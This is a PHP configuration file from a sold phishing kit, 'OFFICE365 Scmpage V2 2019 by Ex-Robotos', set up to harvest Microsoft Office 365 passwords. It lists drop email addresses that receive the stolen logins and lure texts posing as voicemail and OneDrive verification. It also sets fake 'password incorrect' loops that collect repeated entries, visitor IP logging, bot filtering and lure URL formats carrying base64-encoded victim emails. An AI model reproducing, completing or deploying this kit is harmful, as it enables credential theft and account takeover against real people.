<?php
/* 
OFFICE365 Scmpage V2 2019 by Ex-Robotos
Email: ex.robotos@gmail.com
Facebook: facebook.com/Ex.Robotos
ICQ: 745771262
*/
@session_start();error_reporting(0);
$licensekey = "G814R78S12F5T1"; //<==PUT YOUR LICENSE KEY -- License key is limited to single-user
$toEmail = "hemmer.alfred@yandex.com,diamart574@gmail.com"; //<==Use "yourfirst@email.com,yoursecond@email.com" for use multiple emails
$fromemail = "bot@example.com";//
$fromname = "Voicemail Logs";
$subjectTitle = "Voicemail Logs";
$officeLink = "https://office.com";
$FailRedirect = "https://www.wikipedia.org/wiki/Microsoft_Office";
$base64encodeData = true;//true OR false(using base64encoded email value in link or not)
$passloopNumber = 3; //1 to 5
$firstmsg= false; // false/1/2/3/4
//$firstmsg= false: (disabled)
//$firstmsg= 1: (Because you're accessing sensitive info, you need to verify your password)
//$firstmsg= 2: (Enter password to access your office Mail)
//$firstmsg= 3: (Because you're accessing sensitive info, you need to verify your password to access your Voicemail)
//$firstmsg= 4: (Verify your password to access your Microsoft OneDrive)
$error = "Sign in attempt timeout, verify your password";
$error2 =  $error3  =  $error4 = $error5 = "Your password is incorrect. If you don't remember your password";
$successMsg = 'Successfully confirmed. Redirecting to home page ...';
$visitorfileName = "data.txt";//Name of file to save all visitors IP logs or falsemay contain also bot IP logs
$logsfileName = "logs.txt";//Name of file to save real visitors IP logs or false
$TitlesArray=array("verify your account","Verify your identity","verify your credentials","verify your informations","verify your email","verify your login","confirm your account","confirm your identity","confirm your credentials","confirm your information","confirm your email","confirm your login","login to your account","signin to your account","connect your account");
$fixIndex = false; //false or true --- activate it only if you get error related with index.php redirecting
###Link Examples:###
### Base64 Encoded Email###
#### domain.com/office/?email=base64(email)   #####
#### domain.com/office/?target=base64(email)  #####
#### domain.com/office/?data=base64(email)    #####
### Non Encoded Email###
#### domain.com/office/?email=email           #####
#### domain.com/office/?target=email          #####
#### domain.com/office/?data=email            #####
?>